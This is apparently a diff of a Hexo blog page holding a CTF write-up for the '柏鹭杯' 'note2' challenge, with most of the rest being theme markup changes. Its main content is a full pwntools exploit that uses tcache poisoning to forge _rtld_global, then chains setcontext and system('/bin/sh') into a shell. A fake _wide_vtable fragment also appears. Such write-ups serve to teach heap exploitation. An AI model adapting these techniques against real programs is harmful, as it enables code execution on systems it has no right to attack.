b&#x27;\x00&#x27; * 0x68</span><br><span class="line">fake_wide += p64(ogg)     # _wide_vtable + 0x68</span><br><span class="line"># fake_wide = fake_wide.ljust(0xa0, b&#x27;\x00&#x27;)</span><br><span class="line"># fake_wide += p64(heap_base + 0x1c90)    # rsp -&gt; orw_addr</span><br><span class="line"># fake_wide += p64(p_rdi_r + 1)       # rip -&gt; ret</span><br><span class="line">fake_wide = fake_wide.ljust(0xe0, b&#x27;\x00&#x27;)</span><br><span class="line">fake_wide += p64(heapbase + 0xf00 + 0x100)     # _wide_vtable</span><br></pre></td></tr></table></figure>
 
@@ -169,321 +236,70 @@ youlin = Hexo</title>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"># encoding = utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">banary = &quot;./note2&quot;</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">#libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">ip = &#x27;1.14.71.254&#x27;</span><br><span class="line">port = 28581</span><br><span class="line">local = 1</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">else:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)</span><br><span class="line">#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b&quot;\xff&quot;)[-4:].ljust(4, b&#x27;\x00&#x27;))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(12),16)</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line"></span><br><span class="line">def menu(n):</span><br><span class="line">    sla(b&#x27;&gt; &#x27;, str(n))</span><br><span class="line"></span><br><span class="line">def add(idx, size, con):</span><br><span class="line">    menu(1)</span><br><span class="line">    sla(b&#x27;&gt; &#x27;, str(idx))</span><br><span class="line">    sla(b&#x27;&gt; &#x27;, str(size))</span><br><span class="line">    sla(b&#x27;: &#x27;, con)</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    menu(2)</span><br><span class="line">    sla(b&#x27;&gt; &#x27;, str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    menu(3)</span><br><span class="line">    sla(b&#x27;&gt; &#x27;, str(idx))</span><br><span class="line"></span><br><span class="line">for i in range(10):</span><br><span class="line">    add(i,0xf8,b&#x27;youlin&#x27;)</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">show(0)</span><br><span class="line">key=u64(io.recv(5).ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">heapbase=key&lt;&lt;12</span><br><span class="line"></span><br><span class="line">delete(8)</span><br><span class="line">show(8)</span><br><span class="line">libcbase=uu64()-0x219ce0</span><br><span class="line">print(&quot;libcbase:&quot;+hex(libcbase))</span><br><span class="line">system=libcbase+libc.sym[&#x27;system&#x27;]</span><br><span class="line">sh = libcbase + next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class="line">set_context = libcbase + libc.sym[&#x27;setcontext&#x27;] + 61</span><br><span class="line">l_next = libcbase + 0x276890</span><br><span class="line">print(&quot;l_next:&quot;+hex(l_next))</span><br><span class="line">rtld = libcbase + 0x275040</span><br><span class="line">ret = libcbase + 0x29cd6</span><br><span class="line">pop_rdi = libcbase + 0x2a3e5</span><br><span class="line">environ = libcbase + 0x221200</span><br><span class="line">dbg()</span><br><span class="line"></span><br><span class="line">delete(7)</span><br><span class="line">add(6,0x1f8,b&#x27;youlin&#x27;)</span><br><span class="line">add(0,0xf8,b&#x27;youlin&#x27;)</span><br><span class="line"></span><br><span class="line">delete(8)</span><br><span class="line">delete(7)</span><br><span class="line">add(0,0x1f0,b&#x27;A&#x27;*0xf0+p64(0)+p64(0x101)+p64((rtld)^key))</span><br><span class="line"></span><br><span class="line">add(0,0xf0,b&#x27;youlin&#x27;)</span><br><span class="line">add(0,0xf0,p64(heapbase+0xcb0)+ b&#x27;\x04&#x27;+ b&#x27;\x00&#x27;*7)</span><br><span class="line"></span><br><span class="line">fake_rtld_global_addr = heapbase + 0xcb0</span><br><span class="line">fake_rtld_global = p64(0) + p64(l_next) + p64(0) + p64(fake_rtld_global_addr)</span><br><span class="line">fake_rtld_global += p64(set_context) + p64(ret)</span><br><span class="line">fake_rtld_global += p64(sh)</span><br><span class="line">fake_rtld_global += p64(ret)</span><br><span class="line">fake_rtld_global += p64(system)</span><br><span class="line">fake_rtld_global += b&#x27;\x00&#x27; * 0x80</span><br><span class="line">fake_rtld_global += p64(fake_rtld_global_addr + 0x28 + 0x18)</span><br><span class="line">fake_rtld_global += p64(pop_rdi)</span><br><span class="line">fake_rtld_global += b&#x27;\x00&#x27; * (0x100 - len(fake_rtld_global))</span><br><span class="line">fake_rtld_global += p64(fake_rtld_global_addr + 0x10 + 0x110) * 3</span><br><span class="line">fake_rtld_global += p64(0x10)</span><br><span class="line"></span><br><span class="line">add(0, 0x18, b&#x27;a&#x27; * 0x10 + p64(fake_rtld_global_addr + 0x20))</span><br><span class="line">add(1, 0x200, fake_rtld_global)</span><br><span class="line"></span><br><span class="line">payload = b&#x27;\x00&#x27; * 0xfc</span><br><span class="line">payload += p8(0x8) + b&#x27;\x00&#x27; * 3</span><br><span class="line">add(2, 0x200, payload)</span><br><span class="line">menu(4)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
 
 
-  </div>
+    </div>
 
-   <footer>
+    
+    
+    
 
-    <div class="meta">
-  <span class="item">
-    <span class="icon">
-      <i class="ic i-calendar-check"></i>
-    </span>
-    <span class="text">Edited on</span>
-    <time title="Modified: 2022-10-02 14:23:09" itemprop="dateModified" datetime="2022-10-02T14:23:09+08:00">2022-10-02</time>
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/09/21/aarch64/" rel="prev" title="aarch64">
+                  <i class="fa fa-chevron-left"></i> aarch64
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/10/02/%E5%A0%86%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" rel="next" title="堆利用总结">
+                  堆利用总结 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
   </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
 </div>
-
-      
-<div class="reward">
-  <button><i class="ic i-heartbeat"></i> Donate</button>
-  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
-  <div id="qr">
-      
-      <div>
-        <img data-src="/images/wechatpay.png" alt="John Doe WeChat Pay">
-        <p>WeChat Pay</p>
-      </div>
-      
-      <div>
-        <img data-src="/images/alipay.png" alt="John Doe Alipay">
-        <p>Alipay</p>
-      </div>
-      
-      <div>
-        <img data-src="/images/paypal.png" alt="John Doe PayPal">
-        <p>PayPal</p>
-      </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
   </div>
-</div>
 
-      
-
-<div id="copyright">
-<ul>
-  <li class="author">
-    <strong>Post author:  </strong>John Doe <i class="ic i-at"><em>@</em></i>Hexo
-  </li>
-  <li class="link">
-    <strong>Post link: </strong>
-    <a href="http://wscyoulin.github.io/2022/09/22/%E6%9F%8F%E9%B9%AD%E6%9D%AF/" title="柏鹭杯">http://wscyoulin.github.io/2022/09/22/柏鹭杯/</a>
-  </li>
-  <li class="license">
-    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
-  </li>
-</ul>
-</div>
-
+    </div>
   </footer>
 
-</article>
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
 
-  </div>
   
 
-<div class="post-nav">
-    <div class="item left">
-      
 
-  <a href="/2022/09/21/aarch64/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclxxcb6rj20zk0m8b29.jpg" title="aarch64">
-  <span class="type">Previous Post</span>
-  <span class="category"><i class="ic i-flag"></i> </span>
-  <h3>aarch64</h3>
-  </a>
 
-    </div>
-    <div class="item right">
-      
 
-  <a href="/2022/10/02/%E5%A0%86%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gicitzannuj20zk0m8b29.jpg" title="堆利用总结">
-  <span class="type">Next Post</span>
-  <span class="category"><i class="ic i-flag"></i> </span>
-  <h3>堆利用总结</h3>
-  </a>
-
-    </div>
-</div>
 
   
-  <div class="wrap" id="comments"></div>
 
-
-        </div>
-        <div id="sidebar">
-          
-
-<div class="inner">
-
-  <div class="panels">
-    <div class="inner">
-      <div class="contents panel pjax" data-title="Contents">
-          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9F%8F%E9%B9%AD%E6%9D%AF%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">柏鹭杯复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#note1"><span class="toc-number">1.1.</span> <span class="toc-text">note1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#note2"><span class="toc-number">1.2.</span> <span class="toc-text">note2</span></a></li></ol></li></ol>
-      </div>
-      <div class="related panel pjax" data-title="Related">
-        <ul>
-          <li><a href="/2022/03/18/picoCTF-wp/" rel="bookmark" title="picoCTF_wp">picoCTF_wp</a></li><li><a href="/2022/08/21/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/" rel="bookmark" title="巅峰极客复现">巅峰极客复现</a></li><li><a href="/2022/09/20/DASCTF-X-CBCTF-2022%E4%B9%9D%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/" rel="bookmark" title="DASCTF_X_CBCTF_2022九月挑战赛">DASCTF_X_CBCTF_2022九月挑战赛</a></li><li class="active"><a href="/2022/09/22/%E6%9F%8F%E9%B9%AD%E6%9D%AF/" rel="bookmark" title="柏鹭杯">柏鹭杯</a></li>
-        </ul>
-      </div>
-      <div class="overview panel" data-title="Overview">
-        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <img class="image" itemprop="image" alt="John Doe"
-      data-src="/images/avatar.jpg">
-  <p class="name" itemprop="name">John Doe</p>
-  <div class="description" itemprop="description"></div>
-</div>
-
-<nav class="state">
-    <div class="item posts">
-      <a href="/archives/">
-        <span class="count">24</span>
-        <span class="name">posts</span>
-      </a>
-    </div>
-    <div class="item categories">
-      <a href="/categories/">
-        <span class="count">1</span>
-        <span class="name">categories</span>
-      </a>
-    </div>
-</nav>
-
-<div class="social">
-</div>
-
-<ul class="menu">
-  
-    
-  <li class="item">
-    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
-  </li>
-
-
-</ul>
-
-      </div>
-    </div>
-  </div>
-
-  <ul id="quick">
-    <li class="prev pjax">
-        <a href="/2022/09/21/aarch64/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
-    </li>
-    <li class="up"><i class="ic i-arrow-up"></i></li>
-    <li class="down"><i class="ic i-arrow-down"></i></li>
-    <li class="next pjax">
-        <a href="/2022/10/02/%E5%A0%86%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
-    </li>
-    <li class="percent"></li>
-  </ul>
-</div>
-
-
-        </div>
-        <div class="dimmer"></div>
-      </div>
-    </main>
-    <footer id="footer">
-      <div class="inner">
-        <div class="widgets">
-          
-<div class="rpost pjax">
-  <h2>Random Posts</h2>
-  <ul>
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/08/06/%E5%88%A9%E7%94%A8-IO-2-1-stdout%E6%B3%84%E9%9C%B2libc/" title="利用_IO_2_1_stdout泄露libc">利用_IO_2_1_stdout泄露libc</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/09/07/io-file%E5%88%A9%E7%94%A8/" title="io_file利用">io_file利用</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/09/04/awd_pwn%E6%80%BB%E7%BB%93/" title="awd_pwn总结">awd_pwn总结</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/11/25/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" title="sql注入总结">sql注入总结</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/04/10/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/" title="整数溢出">整数溢出</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/08/04/0ctf-2017-babyheap/" title="0ctf_2017_babyheap">0ctf_2017_babyheap</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/08/22/house-of-banana/" title="house_of_banana">house_of_banana</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/11/19/buu-web/" title="buu_web（21-xx)">buu_web（21-xx)</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/10/11/house-of-emma/" title="house_of_emma">house_of_emma</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/10/14/buu-web%EF%BC%881-20%EF%BC%89/" title="buu_web（1-20）">buu_web（1-20）</a></span>
-  </li>
-
-  </ul>
-</div>
-<div>
-  <h2>Recent Comments</h2>
-  <ul class="leancloud-recent-comment"></ul>
-</div>
-
-        </div>
-        <div class="status">
-  <div class="copyright">
-    
-    &copy; 2010 – 
-    <span itemprop="copyrightYear">2022</span>
-    <span class="with-love">
-      <i class="ic i-sakura rotate"></i>
-    </span>
-    <span class="author" itemprop="copyrightHolder">John Doe @ youlin</span>
-  </div>
-  <div class="powered-by">
-    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
-  </div>
-</div>
-
-      </div>
-    </footer>
-  </div>
-<script data-config type="text/javascript">
-  var LOCAL = {
-    path: '2022/09/22/柏鹭杯/',
-    favicon: {
-      show: "（●´3｀●）Goooood",
-      hide: "(´Д｀)Booooom"
-    },
-    search : {
-      placeholder: "Search for Posts",
-      empty: "We didn't find any results for the search: ${query}",
-      stats: "${hits} results found in ${time} ms"
-    },
-    valine: true,fancybox: true,
-    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
-    ignores : [
-      function(uri) {
-        return uri.includes('#');
-      },
-      function(uri) {
-        return new RegExp(LOCAL.path+"$").test(uri);
-      }
-    ]
-  };
-</script>
-
-<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
-
-<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
-
-<script src="/js/app.js?v=0.2.5"></script>
 
 
 
